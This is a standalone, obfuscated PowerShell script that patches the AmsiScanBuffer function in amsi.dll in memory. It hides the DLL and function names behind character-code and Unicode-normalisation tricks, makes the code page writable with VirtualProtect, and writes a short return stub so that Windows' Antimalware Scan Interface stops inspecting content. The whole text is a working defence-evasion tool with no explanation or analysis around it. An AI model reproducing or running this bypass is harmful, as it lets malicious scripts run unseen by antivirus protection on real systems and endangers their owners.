$HxwVIYe1kWEd4M8r = @"
using System;
using System.Runtime.InteropServices;
public class HxwVIYe1kWEd4M8r {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Cwp4vpr54dwvKXpRsNQ4, string MdJW0u6);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr CtHBT25c_CROd, UIntPtr jjZMhyk, uint xgzimXKH5tld8, out uint _wp);
}
"@

Add-Type $HxwVIYe1kWEd4M8r

$IczBhbOppi = [HxwVIYe1kWEd4M8r]::LoadLibrary("$(('ãmsî.d'+'ll').NorMalIZE([CHaR]([BYTE]0x46)+[chAr]([byte]0x6f)+[chAR]([BYte]0x72)+[cHAr]([BYTe]0x6d)+[CHAr](68+22-22)) -replace [chaR](92+72-72)+[char]([bYte]0x70)+[CHAr]([ByTe]0x7b)+[cHar](19+58)+[cHAr](32+78)+[ChAr]([ByTE]0x7d))")
$Mier4ECJLGZ2 = [HxwVIYe1kWEd4M8r]::GetProcAddress($IczBhbOppi, "$(('ÄmsìScânBûff'+'ér').nORMALIZE([cHar](70*30/30)+[cHaR]([byTe]0x6f)+[ChAR]([bytE]0x72)+[chAR]([byte]0x6d)+[chaR](59+9)) -replace [cHar](92*74/74)+[cHar](112+14-14)+[ChaR]([BYte]0x7b)+[CHAR]([byte]0x4d)+[chAr](110)+[Char](125))")
$p = 0
[HxwVIYe1kWEd4M8r]::VirtualProtect($Mier4ECJLGZ2, [uint32]5, 0x40, [ref]$p)
$ZpZF61xFhZRQWNx04GPw = "0xB8"
$kn2pE0_3vkYe3W0 = "0x57"
$PXtjnlLpcfrM = "0x00"
$_Gh8I3fTxXi83 = "0x07"
$IjVqeY1xYC9TW = "0x80"
$MDARq = "0xC3"
$MCpQ_ = [Byte[]] ($ZpZF61xFhZRQWNx04GPw,$kn2pE0_3vkYe3W0,$PXtjnlLpcfrM,$_Gh8I3fTxXi83,+$IjVqeY1xYC9TW,+$MDARq)
[System.Runtime.InteropServices.Marshal]::Copy($MCpQ_, 0, $Mier4ECJLGZ2, 6)